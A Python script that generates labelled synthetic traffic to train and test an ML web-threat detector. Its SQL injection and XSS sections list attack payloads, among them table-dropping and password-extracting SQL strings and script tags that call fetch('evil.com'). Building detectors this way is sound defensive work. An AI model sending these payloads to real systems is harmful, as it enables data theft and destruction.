"""
Train Machine Learning Models for Threat Assessment
Generates diverse training data and trains the ML models
"""

import time
from realtime_threat_assessment import RealTimeThreatSystem

def generate_training_data():
    """Generate diverse training data for ML models"""
    
    print("="*70)
    print("  🤖 TRAINING ML THREAT ASSESSMENT MODELS")
    print("="*70)
    print()
    
    system = RealTimeThreatSystem()
    
    # Track initial state
    initial_status = system.get_ml_model_status()
    print(f"📊 Initial Status:")
    print(f"   Training Samples: {initial_status['total_training_samples']}")
    print(f"   Required: {initial_status['min_samples_required']}")
    print(f"   Model Trained: {initial_status['model_ready']}")
    print()
    
    # Generate diverse scenarios
    print("🔄 Generating training data...\n")
    
    # 1. Normal safe activities (30%)
    print("  Generating safe activities...")
    for i in range(40):
        activity = {
            'type': 'login' if i % 2 == 0 else 'message',
            'ip': f'192.168.1.{i % 20 + 1}',
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'timestamp': time.time(),
            'method': 'GET',
            'path': '/dashboard',
            'params': {}
        }
        system.assess_threat(f'user{i}', activity)
    
    # 2. Low threat - unusual timing (20%)
    print("  Generating low threat scenarios...")
    for i in range(25):
        activity = {
            'type': 'login',
            'ip': f'10.0.0.{i % 10 + 1}',
            'user_agent': 'Mozilla/5.0 (Android Mobile)',
            'timestamp': time.time(),
            'method': 'POST',
            'path': '/login',
            'params': {}
        }
        system.assess_threat(f'user_mobile{i}', activity)
    
    # 3. Medium threat - rate limiting (15%)
    print("  Generating medium threat scenarios...")
    for i in range(20):
        activity = {
            'type': 'request',
            'ip': '203.0.113.100',
            'user_agent': 'Python-Bot/1.0',
            'timestamp': time.time(),
            'method': 'GET',
            'path': f'/api/data{i}',
            'params': {}
        }
        assessment = system.assess_threat('suspicious_user', activity)
        if i < 10:
            time.sleep(0.05)  # Create some rate limit violations
    
    # 4. High threat - rapid actions (15%)
    print("  Generating high threat scenarios...")
    for i in range(15):
        for j in range(3):  # 3 rapid actions per iteration
            activity = {
                'type': 'action',
                'action': f'enumerate_{j}',
                'ip': '198.51.100.50',
                'user_agent': 'AttackBot/2.0',
                'timestamp': time.time(),
                'method': 'POST',
                'path': '/probe',
                'params': {}
            }
            system.assess_threat('attacker_enum', activity)
            time.sleep(0.1)
    
    # 5. Critical threat - SQL injection attempts (10%)
    print("  Generating critical threat scenarios (SQL injection)...")
    sql_payloads = [
        "' OR '1'='1",
        "admin'--",
        "1' UNION SELECT NULL--",
        "'; DROP TABLE users--",
        "1' AND '1'='1",
        "admin' OR 1=1--",
        "' OR 'a'='a",
        "1'; EXEC sp_MSForEachTable--",
        "' UNION ALL SELECT NULL,NULL--",
        "admin'/*",
        # Add more to reach 50+ samples
        "1' OR '1'='1' --",
        "' UNION SELECT password FROM users--",
        "admin' AND 1=1--",
        "' OR 1=1 LIMIT 1--",
        "1' UNION ALL SELECT table_name FROM information_schema.tables--",
        "' OR '1'='1' /*",
        "admin' OR 'x'='x",
        "1'; DELETE FROM users WHERE '1'='1",
    ]
    
    for i, payload in enumerate(sql_payloads):
        activity = {
            'type': 'request',
            'ip': f'203.0.113.{200 + i}',
            'user_agent': 'sqlmap/1.0',
            'timestamp': time.time(),
            'method': 'POST',
            'path': '/login',
            'params': {
                'username': payload,
                'password': 'test'
            }
        }
        system.assess_threat(f'sql_attacker{i}', activity)
    
    # 6. Critical threat - XSS attempts (10%)
    print("  Generating critical threat scenarios (XSS)...")
    xss_payloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        'javascript:alert(1)',
        '<iframe src=javascript:alert(1)>',
        '<body onload=alert(1)>',
        '<script>document.cookie</script>',
        '<img src="x" onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
        '<svg><script>alert(1)</script></svg>',
        '<input onfocus=alert(1) autofocus>',
        # Add more to reach 50+ samples
        '<script>fetch("evil.com")</script>',
        '<img src=x onerror=fetch("evil.com")>',
        '<svg/onload=fetch("evil.com")>',
        '<iframe src=javascript:fetch("evil.com")>',
        '<body onload=fetch("evil.com")>',
    ]
    
    for i, payload in enumerate(xss_payloads):
        activity = {
            'type': 'request',
            'ip': f'198.51.100.{100 + i}',
            'user_agent': 'XSS-Scanner/1.0',
            'timestamp': time.time(),
            'method': 'POST',
            'path': '/comment',
            'params': {
                'comment': payload,
                'name': 'attacker'
            }
        }
        system.assess_threat(f'xss_attacker{i}', activity)
    
    print("\n✅ Training data generation complete!\n")
    
    # Check final status
    final_status = system.get_ml_model_status()
    print("="*70)
    print("📊 Final ML Model Status:")
    print("="*70)
    print(f"   Training Samples: {final_status['total_training_samples']}")
    print(f"   Required Minimum: {final_status['min_samples_required']}")
    print(f"   Model Ready: {'✅ YES' if final_status['model_ready'] else '⏳ NO'}")
    print(f"   Anomaly Detector: {'✅ Trained' if final_status['anomaly_detector_trained'] else '❌ Not trained'}")
    print(f"   Threat Classifier: {'✅ Trained' if final_status['threat_classifier_trained'] else '❌ Not trained'}")
    print(f"   Models Saved: {'✅ YES' if final_status['models_saved'] else '❌ NO'}")
    print()
    
    # Get statistics
    stats = system.get_threat_statistics()
    print("📈 Training Statistics:")
    print(f"   Total Assessments: {stats['total_assessments']}")
    print(f"   Average Risk Score: {stats['average_risk_score']:.2f}/100")
    print()
    print("   Threat Distribution:")
    for level, count in sorted(stats['threat_distribution'].items(), 
                               key=lambda x: {'safe': 0, 'low': 1, 'medium': 2, 'high': 3, 'critical': 4}.get(x[0], 0)):
        percentage = (count / stats['total_assessments'] * 100) if stats['total_assessments'] > 0 else 0
        bar = '█' * int(percentage / 2)
        print(f"      {level.upper():8s}: {count:3d} ({percentage:5.1f}%) {bar}")
    
    print()
    
    if final_status['model_ready']:
        print("="*70)
        print("🎉 SUCCESS! ML models are trained and ready!")
        print("="*70)
        print()
        print("The models can now:")
        print("  ✓ Detect anomalies using Isolation Forest")
        print("  ✓ Classify threats using Random Forest")
        print("  ✓ Predict threat levels with confidence scores")
        print("  ✓ Adapt and retrain as new data arrives")
        print()
        print("Models saved to:")
        print(f"  • {system.correlator.model_path}")
        print(f"  • {system.correlator.scaler_path}")
        print()
    else:
        print("="*70)
        print("⏳ Models are collecting data...")
        print("="*70)
        print()
        samples_needed = final_status['min_samples_required'] - final_status['total_training_samples']
        print(f"Need {samples_needed} more samples to train the models.")
        print("The models will auto-train once enough data is collected.")
        print()
    
    return system

def test_ml_predictions(system):
    """Test ML model predictions on new data"""
    print("="*70)
    print("  🧪 TESTING ML MODEL PREDICTIONS")
    print("="*70)
    print()
    
    test_cases = [
        {
            'name': 'Normal Login',
            'activity': {
                'type': 'login',
                'ip': '192.168.1.99',
                'user_agent': 'Mozilla/5.0',
                'timestamp': time.time(),
                'method': 'GET',
                'path': '/login',
                'params': {}
            },
            'user': 'test_user'
        },
        {
            'name': 'SQL Injection',
            'activity': {
                'type': 'request',
                'ip': '1.2.3.4',
                'user_agent': 'Hacker',
                'timestamp': time.time(),
                'method': 'POST',
                'path': '/login',
                'params': {'user': "' OR 1=1--"}
            },
            'user': 'attacker'
        },
        {
            'name': 'Rapid Requests',
            'activity': {
                'type': 'action',
                'action': 'scan',
                'ip': '5.6.7.8',
                'user_agent': 'Bot',
                'timestamp': time.time(),
                'method': 'GET',
                'path': '/scan',
                'params': {}
            },
            'user': 'bot'
        }
    ]
    
    for test in test_cases:
        print(f"Testing: {test['name']}")
        
        # For rapid requests, simulate multiple
        if 'Rapid' in test['name']:
            for _ in range(25):
                system.assess_threat(test['user'], test['activity'])
                time.sleep(0.05)
        
        assessment = system.assess_threat(test['user'], test['activity'])
        
        print(f"   Result: {assessment.threat_level.upper()}")
        print(f"   Risk Score: {assessment.risk_score:.1f}/100")
        print(f"   Indicators: {len(assessment.indicators)}")
        print()

if __name__ == '__main__':
    try:
        # Generate training data and train models
        system = generate_training_data()
        
        # Test predictions if models are trained
        if system.get_ml_model_status()['model_ready']:
            test_ml_predictions(system)
        
        print("✅ Machine Learning threat assessment system is operational!")
        
    except KeyboardInterrupt:
        print("\n\n⚠️  Training interrupted by user")
    except Exception as e:
        print(f"\n\n❌ Error: {e}")
        import traceback
        traceback.print_exc()
